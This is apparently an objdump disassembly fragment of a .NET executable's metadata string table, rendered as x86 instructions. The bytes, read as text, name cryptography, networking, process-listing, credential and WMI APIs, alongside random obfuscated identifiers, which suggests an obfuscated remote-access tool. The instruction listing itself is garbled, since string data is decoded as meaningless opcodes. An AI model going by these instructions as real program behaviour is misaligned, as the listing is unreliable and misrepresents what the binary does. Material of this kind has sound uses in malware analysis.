  40945b:	6e                   	outsb  %ds:(%esi),(%dx)
  40945c:	62 53 6e             	bound  %edx,0x6e(%ebx)
  40945f:	55                   	push   %ebp
  409460:	71 00                	jno    0x409462
  409462:	74 72                	je     0x4094d6
  409464:	55                   	push   %ebp
  409465:	4c                   	dec    %esp
  409466:	49                   	dec    %ecx
  409467:	71 70                	jno    0x4094d9
  409469:	51                   	push   %ecx
  40946a:	69 44 71 50 62 71 00 	imul   $0x65007162,0x50(%ecx,%esi,2),%eax
  409471:	65 
  409472:	64 6e                	outsb  %fs:(%esi),(%dx)
  409474:	68 44 51 4a 72       	push   $0x724a5144
  409479:	6a 66                	push   $0x66
  40947b:	74 6d                	je     0x4094ea
  40947d:	71 00                	jno    0x40947f
  40947f:	67 46                	addr16 inc %esi
  409481:	73 66                	jae    0x4094e9
  409483:	4c                   	dec    %esp
  409484:	6a 63                	push   $0x63
  409486:	44                   	inc    %esp
  409487:	58                   	pop    %eax
  409488:	57                   	push   %edi
  409489:	49                   	dec    %ecx
  40948a:	6e                   	outsb  %ds:(%esi),(%dx)
  40948b:	71 00                	jno    0x40948d
  40948d:	53                   	push   %ebx
  40948e:	79 73                	jns    0x409503
  409490:	74 65                	je     0x4094f7
  409492:	6d                   	insl   (%dx),%es:(%edi)
  409493:	2e 4c                	cs dec %esp
  409495:	69 6e 71 00 61 47 76 	imul   $0x76476100,0x71(%esi),%ebp
  40949c:	58                   	pop    %eax
  40949d:	6d                   	insl   (%dx),%es:(%edi)
  40949e:	67 6f                	outsl  %ds:(%si),(%dx)
  4094a0:	42                   	inc    %edx
  4094a1:	76 4b                	jbe    0x4094ee
  4094a3:	72 00                	jb     0x4094a5
  4094a5:	4a                   	dec    %edx
  4094a6:	50                   	push   %eax
  4094a7:	4a                   	dec    %edx
  4094a8:	57                   	push   %edi
  4094a9:	51                   	push   %ecx
  4094aa:	44                   	inc    %esp
  4094ab:	6a 4d                	push   $0x4d
  4094ad:	4f                   	dec    %edi
  4094ae:	41                   	inc    %ecx
  4094af:	62 55 72             	bound  %edx,0x72(%ebp)
  4094b2:	00 43 6c             	add    %al,0x6c(%ebx)
  4094b5:	65 61                	gs popa
  4094b7:	72 00                	jb     0x4094b9
  4094b9:	43                   	inc    %ebx
  4094ba:	68 61 72 00 49       	push   $0x49007261
  4094bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4094c0:	76 6f                	jbe    0x409531
  4094c2:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  4094c6:	6d                   	insl   (%dx),%es:(%edi)
  4094c7:	62 65 72             	bound  %esp,0x72(%ebp)
  4094ca:	00 4d 44             	add    %cl,0x44(%ebp)
  4094cd:	35 43 72 79 70       	xor    $0x70797243,%eax
  4094d2:	74 6f                	je     0x409543
  4094d4:	53                   	push   %ebx
  4094d5:	65 72 76             	gs jb  0x40954e
  4094d8:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094df:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  4094e6:	41 
  4094e7:	43                   	inc    %ebx
  4094e8:	72 79                	jb     0x409563
  4094ea:	70 74                	jo     0x409560
  4094ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ed:	53                   	push   %ebx
  4094ee:	65 72 76             	gs jb  0x409567
  4094f1:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094f8:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4094ff:	73 
  409500:	43                   	inc    %ebx
  409501:	72 79                	jb     0x40957c
  409503:	70 74                	jo     0x409579
  409505:	6f                   	outsl  %ds:(%esi),(%dx)
  409506:	53                   	push   %ebx
  409507:	65 72 76             	gs jb  0x409580
  40950a:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409511:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  409518:	72 
  409519:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  409520:	64 65 72 00          	fs gs jb 0x409524
  409524:	4d                   	dec    %ebp
  409525:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40952c:	74 2e                	je     0x40955c
  40952e:	43                   	inc    %ebx
  40952f:	53                   	push   %ebx
  409530:	68 61 72 70 2e       	push   $0x2e707261
  409535:	52                   	push   %edx
  409536:	75 6e                	jne    0x4095a6
  409538:	74 69                	je     0x4095a3
  40953a:	6d                   	insl   (%dx),%es:(%edi)
  40953b:	65 42                	gs inc %edx
  40953d:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  409544:	61                   	popa
  409545:	6c                   	insb   (%dx),%es:(%edi)
  409546:	6c                   	insb   (%dx),%es:(%edi)
  409547:	53                   	push   %ebx
  409548:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  40954f:	65 
  409550:	72 00                	jb     0x409552
  409552:	67 65 74 5f          	addr16 gs je 0x4095b5
  409556:	42                   	inc    %edx
  409557:	75 66                	jne    0x4095bf
  409559:	66 65 72 00          	data16 gs jb 0x40955d
  40955d:	73 65                	jae    0x4095c4
  40955f:	74 5f                	je     0x4095c0
  409561:	42                   	inc    %edx
  409562:	75 66                	jne    0x4095ca
  409564:	66 65 72 00          	data16 gs jb 0x409568
  409568:	67 65 74 5f          	addr16 gs je 0x4095cb
  40956c:	41                   	inc    %ecx
  40956d:	73 49                	jae    0x4095b8
  40956f:	6e                   	outsb  %ds:(%esi),(%dx)
  409570:	74 65                	je     0x4095d7
  409572:	67 65 72 00          	addr16 gs jb 0x409576
  409576:	73 65                	jae    0x4095dd
  409578:	74 5f                	je     0x4095d9
  40957a:	41                   	inc    %ecx
  40957b:	73 49                	jae    0x4095c6
  40957d:	6e                   	outsb  %ds:(%esi),(%dx)
  40957e:	74 65                	je     0x4095e5
  409580:	67 65 72 00          	addr16 gs jb 0x409584
  409584:	4d                   	dec    %ebp
  409585:	61                   	popa
  409586:	6e                   	outsb  %ds:(%esi),(%dx)
  409587:	61                   	popa
  409588:	67 65 6d             	gs insl (%dx),%es:(%di)
  40958b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40958d:	74 4f                	je     0x4095de
  40958f:	62 6a 65             	bound  %ebp,0x65(%edx)
  409592:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409596:	61                   	popa
  409597:	72 63                	jb     0x4095fc
  409599:	68 65 72 00 53       	push   $0x53007265
  40959e:	65 73 73             	gs jae 0x409614
  4095a1:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4095a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4095a9:	67 45                	addr16 inc %ebp
  4095ab:	76 65                	jbe    0x409612
  4095ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ae:	74 48                	je     0x4095f8
  4095b0:	61                   	popa
  4095b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b2:	64 6c                	fs insb (%dx),%es:(%edi)
  4095b4:	65 72 00             	gs jb  0x4095b7
  4095b7:	54                   	push   %esp
  4095b8:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  4095bf:	55                   	push   %ebp
  4095c0:	70 70                	jo     0x409632
  4095c2:	65 72 00             	gs jb  0x4095c5
  4095c5:	43                   	inc    %ebx
  4095c6:	75 72                	jne    0x40963a
  4095c8:	72 65                	jb     0x40962f
  4095ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4095cb:	74 55                	je     0x409622
  4095cd:	73 65                	jae    0x409634
  4095cf:	72 00                	jb     0x4095d1
  4095d1:	53                   	push   %ebx
  4095d2:	74 72                	je     0x409646
  4095d4:	65 61                	gs popa
  4095d6:	6d                   	insl   (%dx),%es:(%edi)
  4095d7:	57                   	push   %edi
  4095d8:	72 69                	jb     0x409643
  4095da:	74 65                	je     0x409641
  4095dc:	72 00                	jb     0x4095de
  4095de:	54                   	push   %esp
  4095df:	65 78 74             	gs js  0x409656
  4095e2:	57                   	push   %edi
  4095e3:	72 69                	jb     0x40964e
  4095e5:	74 65                	je     0x40964c
  4095e7:	72 00                	jb     0x4095e9
  4095e9:	45                   	inc    %ebp
  4095ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4095eb:	74 65                	je     0x409652
  4095ed:	72 00                	jb     0x4095ef
  4095ef:	42                   	inc    %edx
  4095f0:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  4095f7:	72 
  4095f8:	74 65                	je     0x40965f
  4095fa:	72 00                	jb     0x4095fc
  4095fc:	54                   	push   %esp
  4095fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4095fe:	4c                   	dec    %esp
  4095ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409600:	77 65                	ja     0x409667
  409602:	72 00                	jb     0x409604
  409604:	67 4b                	addr16 dec %ebx
  409606:	76 42                	jbe    0x40964a
  409608:	77 78                	ja     0x409682
  40960a:	4a                   	dec    %edx
  40960b:	6d                   	insl   (%dx),%es:(%edi)
  40960c:	50                   	push   %eax
  40960d:	69 6f 72 00 49 45 6e 	imul   $0x6e454900,0x72(%edi),%ebp
  409614:	75 6d                	jne    0x409683
  409616:	65 72 61             	gs jb  0x40967a
  409619:	74 6f                	je     0x40968a
  40961b:	72 00                	jb     0x40961d
  40961d:	4d                   	dec    %ebp
  40961e:	61                   	popa
  40961f:	6e                   	outsb  %ds:(%esi),(%dx)
  409620:	61                   	popa
  409621:	67 65 6d             	gs insl (%dx),%es:(%di)
  409624:	65 6e                	outsb  %gs:(%esi),(%dx)
  409626:	74 4f                	je     0x409677
  409628:	62 6a 65             	bound  %ebp,0x65(%edx)
  40962b:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  40962f:	75 6d                	jne    0x40969e
  409631:	65 72 61             	gs jb  0x409695
  409634:	74 6f                	je     0x4096a5
  409636:	72 00                	jb     0x409638
  409638:	53                   	push   %ebx
  409639:	79 73                	jns    0x4096ae
  40963b:	74 65                	je     0x4096a2
  40963d:	6d                   	insl   (%dx),%es:(%edi)
  40963e:	2e 43                	cs inc %ebx
  409640:	6f                   	outsl  %ds:(%esi),(%dx)
  409641:	6c                   	insb   (%dx),%es:(%edi)
  409642:	6c                   	insb   (%dx),%es:(%edi)
  409643:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409648:	6e                   	outsb  %ds:(%esi),(%dx)
  409649:	73 2e                	jae    0x409679
  40964b:	49                   	dec    %ecx
  40964c:	45                   	inc    %ebp
  40964d:	6e                   	outsb  %ds:(%esi),(%dx)
  40964e:	75 6d                	jne    0x4096bd
  409650:	65 72 61             	gs jb  0x4096b4
  409653:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  409657:	47                   	inc    %edi
  409658:	65 74 45             	gs je  0x4096a0
  40965b:	6e                   	outsb  %ds:(%esi),(%dx)
  40965c:	75 6d                	jne    0x4096cb
  40965e:	65 72 61             	gs jb  0x4096c2
  409661:	74 6f                	je     0x4096d2
  409663:	72 00                	jb     0x409665
  409665:	41                   	inc    %ecx
  409666:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40966a:	61                   	popa
  40966b:	74 6f                	je     0x4096dc
  40966d:	72 00                	jb     0x40966f
  40966f:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  409674:	00 2e                	add    %ch,(%esi)
  409676:	63 63 74             	arpl   %esp,0x74(%ebx)
  409679:	6f                   	outsl  %ds:(%esi),(%dx)
  40967a:	72 00                	jb     0x40967c
  40967c:	4d                   	dec    %ebp
  40967d:	6f                   	outsl  %ds:(%esi),(%dx)
  40967e:	6e                   	outsb  %ds:(%esi),(%dx)
  40967f:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  409686:	65 
  409687:	61                   	popa
  409688:	74 65                	je     0x4096ef
  40968a:	44                   	inc    %esp
  40968b:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40968f:	70 74                	jo     0x409705
  409691:	6f                   	outsl  %ds:(%esi),(%dx)
  409692:	72 00                	jb     0x409694
  409694:	43                   	inc    %ebx
  409695:	72 65                	jb     0x4096fc
  409697:	61                   	popa
  409698:	74 65                	je     0x4096ff
  40969a:	45                   	inc    %ebp
  40969b:	6e                   	outsb  %ds:(%esi),(%dx)
  40969c:	63 72 79             	arpl   %esi,0x79(%edx)
  40969f:	70 74                	jo     0x409715
  4096a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4096a2:	72 00                	jb     0x4096a4
  4096a4:	49                   	dec    %ecx
  4096a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4096a6:	74 50                	je     0x4096f8
  4096a8:	74 72                	je     0x40971c
  4096aa:	00 7a 70             	add    %bh,0x70(%edx)
  4096ad:	4e                   	dec    %esi
  4096ae:	61                   	popa
  4096af:	7a 71                	jp     0x409722
  4096b1:	5a                   	pop    %edx
  4096b2:	4c                   	dec    %esp
  4096b3:	57                   	push   %edi
  4096b4:	53                   	push   %ebx
  4096b5:	53                   	push   %ebx
  4096b6:	41                   	inc    %ecx
  4096b7:	79 78                	jns    0x409731
  4096b9:	72 00                	jb     0x4096bb
  4096bb:	53                   	push   %ebx
  4096bc:	79 73                	jns    0x409731
  4096be:	74 65                	je     0x409725
  4096c0:	6d                   	insl   (%dx),%es:(%edi)
  4096c1:	2e 44                	cs inc %esp
  4096c3:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4096ca:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  4096d1:	72 6f                	jb     0x409742
  4096d3:	73 6f                	jae    0x409744
  4096d5:	66 74 2e             	data16 je 0x409706
  4096d8:	56                   	push   %esi
  4096d9:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4096e0:	73 69                	jae    0x40974b
  4096e2:	63 2e                	arpl   %ebp,(%esi)
  4096e4:	44                   	inc    %esp
  4096e5:	65 76 69             	gs jbe 0x409751
  4096e8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096eb:	00 53 79             	add    %dl,0x79(%ebx)
  4096ee:	73 74                	jae    0x409764
  4096f0:	65 6d                	gs insl (%dx),%es:(%edi)
  4096f2:	2e 52                	cs push %edx
  4096f4:	75 6e                	jne    0x409764
  4096f6:	74 69                	je     0x409761
  4096f8:	6d                   	insl   (%dx),%es:(%edi)
  4096f9:	65 2e 49             	gs cs dec %ecx
  4096fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4096fd:	74 65                	je     0x409764
  4096ff:	72 6f                	jb     0x409770
  409701:	70 53                	jo     0x409756
  409703:	65 72 76             	gs jb  0x40977c
  409706:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40970d:	73 74                	jae    0x409783
  40970f:	65 6d                	gs insl (%dx),%es:(%edi)
  409711:	2e 52                	cs push %edx
  409713:	75 6e                	jne    0x409783
  409715:	74 69                	je     0x409780
  409717:	6d                   	insl   (%dx),%es:(%edi)
  409718:	65 2e 43             	gs cs inc %ebx
  40971b:	6f                   	outsl  %ds:(%esi),(%dx)
  40971c:	6d                   	insl   (%dx),%es:(%edi)
  40971d:	70 69                	jo     0x409788
  40971f:	6c                   	insb   (%dx),%es:(%edi)
  409720:	65 72 53             	gs jb  0x409776
  409723:	65 72 76             	gs jb  0x40979c
  409726:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40972d:	62 75 67             	bound  %esi,0x67(%ebp)
  409730:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409737:	65 
  409738:	73 00                	jae    0x40973a
  40973a:	45                   	inc    %ebp
  40973b:	78 70                	js     0x4097ad
  40973d:	61                   	popa
  40973e:	6e                   	outsb  %ds:(%esi),(%dx)
  40973f:	64 45                	fs inc %ebp
  409741:	6e                   	outsb  %ds:(%esi),(%dx)
  409742:	76 69                	jbe    0x4097ad
  409744:	72 6f                	jb     0x4097b5
  409746:	6e                   	outsb  %ds:(%esi),(%dx)
  409747:	6d                   	insl   (%dx),%es:(%edi)
  409748:	65 6e                	outsb  %gs:(%esi),(%dx)
  40974a:	74 56                	je     0x4097a2
  40974c:	61                   	popa
  40974d:	72 69                	jb     0x4097b8
  40974f:	61                   	popa
  409750:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409754:	00 47 65             	add    %al,0x65(%edi)
  409757:	74 50                	je     0x4097a9
  409759:	72 6f                	jb     0x4097ca
  40975b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40975e:	73 65                	jae    0x4097c5
  409760:	73 00                	jae    0x409762
  409762:	47                   	inc    %edi
  409763:	65 74 48             	gs je  0x4097ae
  409766:	6f                   	outsl  %ds:(%esi),(%dx)
  409767:	73 74                	jae    0x4097dd
  409769:	41                   	inc    %ecx
  40976a:	64 64 72 65          	fs fs jb 0x4097d3
  40976e:	73 73                	jae    0x4097e3
  409770:	65 73 00             	gs jae 0x409773
  409773:	53                   	push   %ebx
  409774:	79 73                	jns    0x4097e9
  409776:	74 65                	je     0x4097dd
  409778:	6d                   	insl   (%dx),%es:(%edi)
  409779:	2e 53                	cs push %ebx
  40977b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40977f:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409786:	70 
  409787:	74 6f                	je     0x4097f8
  409789:	67 72 61             	addr16 jb 0x4097ed
  40978c:	70 68                	jo     0x4097f6
  40978e:	79 2e                	jns    0x4097be
  409790:	58                   	pop    %eax
  409791:	35 30 39 43 65       	xor    $0x65433930,%eax
  409796:	72 74                	jb     0x40980c
  409798:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40979f:	73 00                	jae    0x4097a1
  4097a1:	52                   	push   %edx
  4097a2:	66 63 32             	arpl   %si,(%edx)
  4097a5:	38 39                	cmp    %bh,(%ecx)
  4097a7:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  4097ab:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  4097b2:	73 00                	jae    0x4097b4
  4097b4:	52                   	push   %edx
  4097b5:	65 61                	gs popa
  4097b7:	64 41                	fs inc %ecx
  4097b9:	6c                   	insb   (%dx),%es:(%edi)
  4097ba:	6c                   	insb   (%dx),%es:(%edi)
  4097bb:	42                   	inc    %edx
  4097bc:	79 74                	jns    0x409832
  4097be:	65 73 00             	gs jae 0x4097c1
  4097c1:	47                   	inc    %edi
  4097c2:	65 74 42             	gs je  0x409807
  4097c5:	79 74                	jns    0x40983b
  4097c7:	65 73 00             	gs jae 0x4097ca
  4097ca:	69 6a 53 66 68 53 73 	imul   $0x73536866,0x53(%edx),%ebp
  4097d1:	63 43 66             	arpl   %eax,0x66(%ebx)
  4097d4:	73 00                	jae    0x4097d6
  4097d6:	41                   	inc    %ecx
  4097d7:	56                   	push   %esi
  4097d8:	6c                   	insb   (%dx),%es:(%edi)
  4097d9:	50                   	push   %eax
  4097da:	42                   	inc    %edx
  4097db:	4d                   	dec    %ebp
  4097dc:	48                   	dec    %eax
  4097dd:	63 54 66 4c          	arpl   %edx,0x4c(%esi,%eiz,2)
  4097e1:	66 73 00             	data16 jae 0x4097e4
  4097e4:	43                   	inc    %ebx
  4097e5:	53                   	push   %ebx
  4097e6:	68 61 72 70 41       	push   $0x41707261
  4097eb:	72 67                	jb     0x409854
  4097ed:	75 6d                	jne    0x40985c
  4097ef:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097f1:	74 49                	je     0x40983c
  4097f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097f6:	46                   	inc    %esi
  4097f7:	6c                   	insb   (%dx),%es:(%edi)
  4097f8:	61                   	popa
  4097f9:	67 73 00             	addr16 jae 0x4097fc
  4097fc:	43                   	inc    %ebx
  4097fd:	53                   	push   %ebx
  4097fe:	68 61 72 70 42       	push   $0x42707261
  409803:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  40980a:	61                   	popa
  40980b:	67 73 00             	addr16 jae 0x40980e
  40980e:	53                   	push   %ebx
  40980f:	74 72                	je     0x409883
  409811:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  409818:	73 73                	jae    0x40988d
  40981a:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409821:	6e                   	outsb  %ds:(%esi),(%dx)
  409822:	67 45                	addr16 inc %ebp
  409824:	76 65                	jbe    0x40988b
  409826:	6e                   	outsb  %ds:(%esi),(%dx)
  409827:	74 41                	je     0x40986a
  409829:	72 67                	jb     0x409892
  40982b:	73 00                	jae    0x40982d
  40982d:	77 6b                	ja     0x40989a
  40982f:	48                   	dec    %eax
  409830:	4f                   	dec    %edi
  409831:	42                   	inc    %edx
  409832:	74 79                	je     0x4098ad
  409834:	46                   	inc    %esi
  409835:	4e                   	dec    %esi
  409836:	4e                   	dec    %esi
  409837:	44                   	inc    %esp
  409838:	6a 73                	push   $0x73
  40983a:	00 49 43             	add    %cl,0x43(%ecx)
  40983d:	72 65                	jb     0x4098a4
  40983f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409842:	74 69                	je     0x4098ad
  409844:	61                   	popa
  409845:	6c                   	insb   (%dx),%es:(%edi)
  409846:	73 00                	jae    0x409848
  409848:	73 65                	jae    0x4098af
  40984a:	74 5f                	je     0x4098ab
  40984c:	43                   	inc    %ebx
  40984d:	72 65                	jb     0x4098b4
  40984f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409852:	74 69                	je     0x4098bd
  409854:	61                   	popa
  409855:	6c                   	insb   (%dx),%es:(%edi)
  409856:	73 00                	jae    0x409858
  409858:	45                   	inc    %ebp
  409859:	71 75                	jno    0x4098d0
  40985b:	61                   	popa
  40985c:	6c                   	insb   (%dx),%es:(%edi)
  40985d:	73 00                	jae    0x40985f
  40985f:	53                   	push   %ebx
  409860:	73 6c                	jae    0x4098ce
  409862:	50                   	push   %eax
  409863:	72 6f                	jb     0x4098d4
  409865:	74 6f                	je     0x4098d6
  409867:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40986a:	73 00                	jae    0x40986c
  40986c:	53                   	push   %ebx
  40986d:	79 73                	jns    0x4098e2
  40986f:	74 65                	je     0x4098d6
  409871:	6d                   	insl   (%dx),%es:(%edi)
  409872:	2e 57                	cs push %edi
  409874:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  40987b:	46                   	inc    %esi
  40987c:	6f                   	outsl  %ds:(%esi),(%dx)
  40987d:	72 6d                	jb     0x4098ec
  40987f:	73 00                	jae    0x409881
  409881:	44                   	inc    %esp
  409882:	6e                   	outsb  %ds:(%esi),(%dx)
  409883:	73 00                	jae    0x409885
  409885:	43                   	inc    %ebx
  409886:	6f                   	outsl  %ds:(%esi),(%dx)
  409887:	6e                   	outsb  %ds:(%esi),(%dx)
  409888:	74 61                	je     0x4098eb
  40988a:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409891:	74 65                	je     0x4098f8
  409893:	6d                   	insl   (%dx),%es:(%edi)
  409894:	2e 43                	cs inc %ebx
  409896:	6f                   	outsl  %ds:(%esi),(%dx)
  409897:	6c                   	insb   (%dx),%es:(%edi)
  409898:	6c                   	insb   (%dx),%es:(%edi)
  409899:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40989e:	6e                   	outsb  %ds:(%esi),(%dx)
  40989f:	73 00                	jae    0x4098a1
  4098a1:	53                   	push   %ebx
  4098a2:	74 72                	je     0x409916
  4098a4:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  4098ab:	74 4f                	je     0x4098fc
  4098ad:	70 74                	jo     0x409923
  4098af:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  4098b6:	74 49                	je     0x409901
  4098b8:	6d                   	insl   (%dx),%es:(%edi)
  4098b9:	61                   	popa
  4098ba:	67 65 44             	addr16 gs inc %esp
  4098bd:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  4098c1:	65 72 73             	gs jb  0x409937
  4098c4:	00 52 75             	add    %dl,0x75(%edx)
  4098c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4098c8:	74 69                	je     0x409933
  4098ca:	6d                   	insl   (%dx),%es:(%edi)
  4098cb:	65 48                	gs dec %eax
  4098cd:	65 6c                	gs insb (%dx),%es:(%edi)
  4098cf:	70 65                	jo     0x409936
  4098d1:	72 73                	jb     0x409946
  4098d3:	00 53 73             	add    %dl,0x73(%ebx)
  4098d6:	6c                   	insb   (%dx),%es:(%edi)
  4098d7:	50                   	push   %eax
  4098d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4098d9:	6c                   	insb   (%dx),%es:(%edi)
  4098da:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  4098e1:	72 73                	jb     0x409956
  4098e3:	00 46 69             	add    %al,0x69(%esi)
  4098e6:	6c                   	insb   (%dx),%es:(%edi)
  4098e7:	65 41                	gs inc %ecx
  4098e9:	63 63 65             	arpl   %esp,0x65(%ebx)
  4098ec:	73 73                	jae    0x409961
  4098ee:	00 47 65             	add    %al,0x65(%edi)
  4098f1:	74 43                	je     0x409936
  4098f3:	75 72                	jne    0x409967
  4098f5:	72 65                	jb     0x40995c
  4098f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4098f8:	74 50                	je     0x40994a
  4098fa:	72 6f                	jb     0x40996b
  4098fc:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098ff:	73 00                	jae    0x409901
  409901:	49                   	dec    %ecx
  409902:	50                   	push   %eax
  409903:	41                   	inc    %ecx
  409904:	64 64 72 65          	fs fs jb 0x40996d
  409908:	73 73                	jae    0x40997d
  40990a:	00 53 79             	add    %dl,0x79(%ebx)
  40990d:	73 74                	jae    0x409983
  40990f:	65 6d                	gs insl (%dx),%es:(%edi)
  409911:	2e 4e                	cs dec %esi
  409913:	65 74 2e             	gs je  0x409944
  409916:	53                   	push   %ebx
  409917:	6f                   	outsl  %ds:(%esi),(%dx)
  409918:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40991b:	74 73                	je     0x409990
  40991d:	00 73 65             	add    %dh,0x65(%ebx)
  409920:	74 5f                	je     0x409981
  409922:	41                   	inc    %ecx
  409923:	72 67                	jb     0x40998c
  409925:	75 6d                	jne    0x409994
  409927:	65 6e                	outsb  %gs:(%esi),(%dx)
  409929:	74 73                	je     0x40999e
  40992b:	00 53 79             	add    %dl,0x79(%ebx)
  40992e:	73 74                	jae    0x4099a4
  409930:	65 6d                	gs insl (%dx),%es:(%edi)
  409932:	45                   	inc    %ebp
  409933:	76 65                	jbe    0x40999a
  409935:	6e                   	outsb  %ds:(%esi),(%dx)
  409936:	74 73                	je     0x4099ab
  409938:	00 45 78             	add    %al,0x78(%ebp)
  40993b:	69 73 74 73 00 4a 6d 	imul   $0x6d4a0073,0x74(%ebx),%esi
  409942:	54                   	push   %esp
  409943:	65 6f                	outsl  %gs:(%esi),(%dx)
  409945:	4e                   	dec    %esi
  409946:	50                   	push   %eax
  409947:	7a 43                	jp     0x40998c
  409949:	74 00                	je     0x40994b
  40994b:	76 77                	jbe    0x4099c4
  40994d:	56                   	push   %esi
  40994e:	51                   	push   %ecx
  40994f:	69 4a 41 57 4a 4e 55 	imul   $0x554e4a57,0x41(%edx),%ecx
  409956:	77 47                	ja     0x40999f
  409958:	74 00                	je     0x40995a
  40995a:	57                   	push   %edi
  40995b:	56                   	push   %esi
  40995c:	55                   	push   %ebp
  40995d:	71 55                	jno    0x4099b4
  40995f:	6d                   	insl   (%dx),%es:(%edi)
  409960:	4b                   	dec    %ebx
  409961:	71 63                	jno    0x4099c6
  409963:	4c                   	dec    %esp
  409964:	4c                   	dec    %esp
  409965:	48                   	dec    %eax
  409966:	74 00                	je     0x409968
  409968:	6a 48                	push   $0x48
  40996a:	6c                   	insb   (%dx),%es:(%edi)
  40996b:	66 69 6a 6e 6b 6f    	imul   $0x6f6b,0x6e(%edx),%bp
  409971:	4a                   	dec    %edx
  409972:	68 51 74 00 6b       	push   $0x6b007451
  409977:	44                   	inc    %esp
  409978:	4c                   	dec    %esp
  409979:	41                   	inc    %ecx
  40997a:	44                   	inc    %esp
  40997b:	43                   	inc    %ebx
  40997c:	67 4e                	addr16 dec %esi
  40997e:	7a 5a                	jp     0x4099da
  409980:	74 00                	je     0x409982
  409982:	43                   	inc    %ebx
  409983:	6f                   	outsl  %ds:(%esi),(%dx)
  409984:	6e                   	outsb  %ds:(%esi),(%dx)
  409985:	63 61 74             	arpl   %esp,0x74(%ecx)
  409988:	00 49 6d             	add    %cl,0x6d(%ecx)
  40998b:	61                   	popa
  40998c:	67 65 46             	addr16 gs inc %esi
  40998f:	6f                   	outsl  %ds:(%esi),(%dx)
  409990:	72 6d                	jb     0x4099ff
  409992:	61                   	popa
  409993:	74 00                	je     0x409995
  409995:	67 65 74 5f          	addr16 gs je 0x4099f8
  409999:	41                   	inc    %ecx
  40999a:	73 46                	jae    0x4099e2
  40999c:	6c                   	insb   (%dx),%es:(%edi)
  40999d:	6f                   	outsl  %ds:(%esi),(%dx)
  40999e:	61                   	popa
